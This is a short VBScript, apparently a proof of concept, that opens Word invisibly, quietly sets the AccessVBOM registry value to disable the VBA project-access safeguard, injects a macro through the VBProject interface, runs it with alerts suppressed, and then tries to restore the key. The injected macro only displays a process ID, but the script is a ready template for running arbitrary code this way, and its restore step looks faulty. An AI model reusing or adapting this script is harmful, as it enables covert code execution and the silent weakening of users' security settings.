Dim objWord, s, RegPath, action, objDocument, xlmodule

' Create hidden Word object
Set objWord = CreateObject("Word.Application")
objWord.Visible = False
Set s = CreateObject("WScript.Shell")

' Ensure required registry keys are set
function RegExists(regKey)
	on error resume next
	s.RegRead regKey
	RegExists = (Err.number = 0)
end function
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Word\Security\AccessVBOM"
if RegExists(RegPath) then
	action = s.RegRead(RegPath)
else
	action = ""
end if
s.RegWrite RegPath, 1, "REG_DWORD"

' Add macro
Set objDocument = objWord.Documents.Add()
Set xlmodule = objDocument.VBProject.VBComponents.Add(1)
strCode = "Declare Function GetCurrentProcessId Lib "&Chr(34)&"kernel32"&Chr(34)&" () As Integer"&Chr(10)&"Sub mymacro()"&Chr(10)&"Dim z As Integer"&Chr(10)&"z = GetCurrentProcessId()"&Chr(10)&"MsgBox z"&Chr(10)&"End Sub"
xlmodule.CodeModule.AddFromString strCode
objWord.DisplayAlerts = False
on error resume next

' Run macro
objWord.Run "mymacro"
objDocument.Close False
objWord.Quit

' Reset reg key
if action = "" then
	s.RegWrite RegPath, action, "REG_DWORD"
end if